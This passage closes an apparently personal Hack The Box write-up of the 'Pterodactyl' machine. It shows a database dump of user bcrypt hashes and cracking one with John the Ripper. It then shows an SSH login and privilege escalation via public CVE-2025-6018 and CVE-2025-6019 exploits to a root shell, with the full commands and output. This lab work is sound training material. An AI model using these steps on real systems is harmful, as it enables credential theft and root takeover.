+-rwsr-xr-x 1 root root 76096 Sep  5  2024 /usr/bin/su                                                                                                                                                                                          
+-rwsr-xr-x 1 root root 35136 Sep  5  2024 /usr/bin/umount                                                                                                                                                                                      
+-rwsr-xr-x 1 root trusted 35616 Sep 17  2018 /usr/bin/fusermount                                                                                                                                                                               
+-rwsr-xr-x 1 root trusted 60176 Jan 18  2023 /usr/bin/crontab                                                                                                                                                                                  
+-rwsr-xr-x 1 root root 142288 Jun 16  2025 /sbin/mount.nfs                                                                                                                                                                                     
+-rwsr-xr-x 1 root shadow 14768 Jan  9  2024 /sbin/unix2_chkpwd                                                                                                                                                                                 
+-rwsr-xr-x 1 root shadow 35544 Jan  9  2024 /sbin/unix_chkpwd
+</code></pre>
+<ul>
+<li>Looking online, a priv-esc vulnerability exists online
+<ul>
+<li><a href="https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/" class="external external-link">https://blog.securelayer7.net/cve-2025-6019-local-privilege-escalation/<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+</ul>
+</li>
+<li>However, it appears that we need a SSH connection for most PoCs, so we need to jump onto a system user</li>
+<li>So, I will go ahead and log into the database again, and it worked!</li>
+</ul>
+<pre><code>wwwrun@pterodactyl:/var/www/pterodactyl> mariadb -h 127.0.0.1 -u pterodactyl -p panel  
+&lt;actyl> mariadb -h 127.0.0.1 -u pterodactyl -p panel  
+Enter password: PteraPanel  
+  
+Reading table information for completion of table and column names  
+You can turn off this feature to get a quicker startup with -A  
+  
+Welcome to the MariaDB monitor.  Commands end with ; or \g.  
+Your MariaDB connection id is 93  
+Server version: 11.8.3-MariaDB MariaDB package  
+  
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  
+  
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
+  
+MariaDB [panel]>
+</code></pre>
+<ul>
+<li>So, now I will go ahead and see if I can find any user tables</li>
+</ul>
+<pre><code>MariaDB [panel]> SHOW TABLES;  
+SHOW TABLES;  
++-----------------------+  
+| Tables_in_panel       |  
++-----------------------+  
+| activity_log_subjects |  
+| activity_logs         |  
+| allocations           |  
+| api_keys              |  
+| api_logs              |  
+| audit_logs            |  
+| backups               |  
+| database_hosts        |  
+| databases             |  
+| egg_mount             |  
+| egg_variables         |  
+| eggs                  |  
+| failed_jobs           |  
+| jobs                  |  
+| locations             |  
+| migrations            |  
+| mount_node            |  
+| mount_server          |  
+| mounts                |  
+| nests                 |  
+| nodes                 |  
+| notifications         |  
+| password_resets       |  
+| recovery_tokens       |  
+| schedules             |  
+| server_transfers      |  
+| server_variables      |  
+| servers               |  
+| sessions              |  
+| settings              |  
+| subusers              |  
+| tasks                 |  
+| tasks_log             |  
+| user_ssh_keys         |  
+| users                 |  
++-----------------------+  
+35 rows in set (0.001 sec)
+</code></pre>
+<ul>
+<li>I am then able to dump the users table out</li>
+</ul>
+<pre><code>MariaDB [panel]> SELECT * FROM users;  
+SELECT * FROM users;  
++----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+------------  
+--------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+  
+| id | external_id | uuid                                 | username     | email                        | name_first | name_last | password                                                     | remember_to  
+ken                                               | language | root_admin | use_totp | totp_secret | totp_authenticated_at | gravatar | created_at          | updated_at          |  
++----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+------------  
+--------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+  
+|  2 | NULL        | 5e6d956e-7be9-41ec-8016-45e434de8420 | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | OL0dNy1nehB  
+Ydx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU | en       |          1 |        0 | NULL        | NULL                  |        1 | 2025-09-16 17:15:41 | 2025-09-16 17:15:41 |  
+|  3 | NULL        | ac7ba5c2-6fd8-4600-aeb6-f15a3906982b | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | 6XGbHcVLLV9  
+fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8 | en       |          0 |        0 | NULL        | NULL                  |        1 | 2025-09-16 19:44:19 | 2025-11-07 18:28:50 |  
++----+-------------+--------------------------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+------------  
+--------------------------------------------------+----------+------------+----------+-------------+-----------------------+----------+---------------------+---------------------+  
+2 rows in set (0.001 sec)
+</code></pre>
+<ul>
+<li>From this dump, I am able to create two user credentials from this:</li>
+</ul>
+<pre><code>headmonitor:$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
+phileasfogg3:$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
+</code></pre>
+<ul>
+<li>I am able to pull out the passwords for these, but they are hashed.</li>
+<li>These appear to be bcrypt hashes, so we will need to crack these somehow</li>
+<li>We can use John the Ripper here for this</li>
+</ul>
+<pre><code>john --wordlist=`fzf-wordlists` --format=bcrypt headmonitor_hash
+
+john --wordlist=`fzf-wordlists` --format=bcrypt phileasfogg3_hash
+</code></pre>
+<ul>
+<li>However, I am going to try phileasfogg3 first since that is where I found the user flag first</li>
+<li>I was able to find their password!</li>
+</ul>
+<pre><code>[Feb 13, 2026 - 20:54:20 (PST)] exegol-htb-season Hashes # john --wordlist=`fzf-wordlists` --format=bcrypt phileasfogg3_hash    
+Using default input encoding: UTF-8  
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])  
+Cost 1 (iteration count) is 1024 for all loaded hashes  
+Will run 32 OpenMP threads  
+Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)  
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
+!QAZ2wsx         (?)        
+1g 0:00:00:11 DONE (2026-02-13 20:55) 0.08511g/s 1201p/s 1201c/s 1201C/s gerber..aminah  
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably  
+Session completed.
+</code></pre>
+<ul>
+<li>With this information, we now have one set of full credentials
+<ul>
+<li>phileasfogg3:!QAZ2wsx</li>
+</ul>
+</li>
+<li>So, with this information, I will try to SSH into the machine now, and this works!</li>
+</ul>
+<pre><code>[Feb 13, 2026 - 20:55:52 (PST)] exegol-htb-season Hashes # ssh phileasfogg3@10.129.5.98                  
+The authenticity of host '10.129.5.98 (10.129.5.98)' can't be established.  
+ED25519 key fingerprint is SHA256:FOOqnHbybkpXftYgyrorbBxkgW0L4yMSLYxG8F87SDE.  
+This key is not known by any other names.  
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
+Warning: Permanently added '10.129.5.98' (ED25519) to the list of known hosts.  
+(phileasfogg3@10.129.5.98) Password:    
+Have a lot of fun...  
+Last login: Sat Feb 14 06:57:01 2026 from 10.10.14.127  
+phileasfogg3@pterodactyl:~>
+</code></pre>
+<ul>
+<li>Alright, cool! Now, we are able to use our priv-esc exploit now.</li>
+<li>First we need to setup the environment first, which we can do using this
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/52386" class="external external-link">https://www.exploit-db.com/exploits/52386<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+</ul>
+</li>
+<li>So, let’s get that set up</li>
+</ul>
+<pre><code>[Feb 15, 2026 - 21:36:04 (PST)] exegol-htb-seasons /workspace # python3 52386 -i 10.129.8.214 -u phileasfogg3 -p '!QAZ2wsx'  
+2026-02-15 21:36:10 [WARNING] Use only with proper authorization!  
+2026-02-15 21:36:10 [INFO] Starting CVE-2025-6018 exploit against 10.129.8.214:22  
+2026-02-15 21:36:10 [INFO] Connecting to 10.129.8.214:22 as phileasfogg3  
+2026-02-15 21:36:10 [INFO] Connected (version 2.0, client OpenSSH_9.6)  
+2026-02-15 21:36:10 [INFO] Authentication (password) successful!  
+2026-02-15 21:36:10 [INFO] SSH connection established  
+2026-02-15 21:36:10 [INFO] Starting vulnerability assessment  
+2026-02-15 21:36:10 [INFO] Executing check: pam_version  
+2026-02-15 21:36:11 [INFO] Vulnerable PAM version detected: pam-1.3.0  
+2026-02-15 21:36:12 [INFO] Executing check: pam_env  
+2026-02-15 21:36:12 [INFO] pam_env.so configuration found  
+2026-02-15 21:36:12 [INFO] Executing check: pam_systemd  
+2026-02-15 21:36:13 [INFO] pam_systemd.so found - escalation vector available  
+2026-02-15 21:36:13 [INFO] Executing check: systemd_version  
+2026-02-15 21:36:14 [INFO] Target appears vulnerable, proceeding with exploitation  
+2026-02-15 21:36:14 [INFO] Creating malicious environment file  
+2026-02-15 21:36:14 [INFO] Writing .pam_environment file  
+2026-02-15 21:36:15 [INFO] Malicious environment file created successfully  
+2026-02-15 21:36:15 [INFO] Reconnecting to trigger PAM environment loading  
+2026-02-15 21:36:17 [INFO] Connected (version 2.0, client OpenSSH_9.6)  
+2026-02-15 21:36:17 [INFO] Authentication (password) successful!  
+2026-02-15 21:36:17 [INFO] Reconnection successful  
+2026-02-15 21:36:17 [INFO] Testing privilege escalation vectors  
+2026-02-15 21:36:17 [INFO] Testing: SystemD Reboot  
+2026-02-15 21:36:18 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Reboot  
+2026-02-15 21:36:18 [INFO] Testing: SystemD Shutdown  
+2026-02-15 21:36:18 [INFO] PRIVILEGE ESCALATION DETECTED: SystemD Shutdown  
+2026-02-15 21:36:18 [INFO] Testing: PolicyKit Check  
+2026-02-15 21:36:19 [INFO] No escalation detected: PolicyKit Check  
+2026-02-15 21:36:19 [INFO] EXPLOITATION SUCCESSFUL - Privilege escalation confirmed  
+2026-02-15 21:36:19 [INFO] Starting interactive shell session  
+  
+--- Interactive Shell ---  
+Commands: 'exit' to quit, 'status' for privilege check  
+exploit$
+</code></pre>
+<ul>
+<li>We can go ahead and run that to take advantage of  that now
+<ul>
+<li><a href="https://github.com/guinea-offensive-security/CVE-2025-6019" class="external external-link">https://github.com/guinea-offensive-security/CVE-2025-6019<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a></li>
+</ul>
+</li>
+<li>We can then generate our image, and then transfer that plus the script onto the system.</li>
+<li>We can then run it to take advantage of the exploit and get a root shell</li>
+</ul>
+<pre><code>phileasfogg3@pterodactyl:/tmp> ./exploit.sh    
+PoC for CVE-2025-6019 (LPE via libblockdev/udisks)  
+WARNING: Only run this on authorized systems. Unauthorized use is illegal.  
+Continue? [y/N]: y  
+[*] Checking for vulnerable libblockdev/udisks versions...  
+[*] Detected udisks version: unknown  
+[!] Warning: Specific vulnerable versions for CVE-2025-6019 are unknown.  
+[!] Verify manually that the target system runs a vulnerable version of libblockdev/udisks.  
+[!] Continuing with PoC execution...  
+Select mode:  
+[L]ocal: Create 300 MB XFS image (requires root)  
+[C]ible: Exploit target system  
+[L]ocal or [C]ible? (L/C): C  
+[+] All dependencies are installed.  
+[*] Starting exploitation on target machine...  
+[*] Checking allow_active status...  
+[+] allow_active status confirmed.  
+[*] Verifying xfs.image integrity...  
+[*] Stopping gvfs-udisks2-volume-monitor...  
+[*] Note: gvfs-udisks2-volume-monitor was not running.  
+[*] Setting up loop device...  
+[+] Loop device configured: /dev/loop0  
+[*] Keeping filesystem busy to prevent unmounting...  
+[+] Background loop started (PID: 11090)  
+[*] Resizing filesystem to trigger mount...  
+[+] Mount successful (expected error: target is busy).  
+[*] Waiting 2 seconds for mount to stabilize...  
+[*] Checking for SUID bash in /tmp/blockdev*...  
+[+] SUID bash found: /tmp/blockdev.V2XXK3/bash  
+-rwsr-xr-x 1 root root 1012656 Feb 16 07:50 /tmp/blockdev.V2XXK3/bash  
+[*] Executing root shell...  
+bash-4.4# whoami  
+root
+</code></pre>
+<ul>
+<li>Now we can get our root flag!</li>
+</ul>
+<pre><code>bash-4.4# cat root.txt    
+028be0fd1e973b31b91fdfbb7097bad3
+</code></pre></div></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
+                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
+                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
+                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
+                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
+                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
+                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
+                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
+                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
+                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
+                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true}"></div></div></div><div class="toc"><button type="button" class="toc-header" aria-controls="toc-7" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul id="list-0" class="toc-content overflow"><li class="depth-0"><a href="#flags" data-for="flags">Flags</a></li><li class="depth-0"><a href="#notes" data-for="notes">Notes</a></li><li class="overflow-end"></li></ul></div><div class="backlinks"><h3>Backlinks</h3><ul id="list-0" class="overflow"><li><a href="../hack-the-box---machines/htb-machines" class="internal">Hack the Box: Machine Writeups</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v5.0.0</a> © 2026</p><ul><li><a href="https://github.com/jackyzha0/quartz">GitHub</a></li><li><a href="https://discord.gg/cRFFHYye7t">Discord Community</a></li></ul></footer></div></div></body><script src="../static/resource-after-e13fffa1.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-8b336f9a.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-baba652b.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-5eb75950.js" type="module" data-persist="true"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-683f275d.js" type="application/javascript" data-persist="true"></script><script src="../postscript.js" type="module" data-persist="true"></script></html>
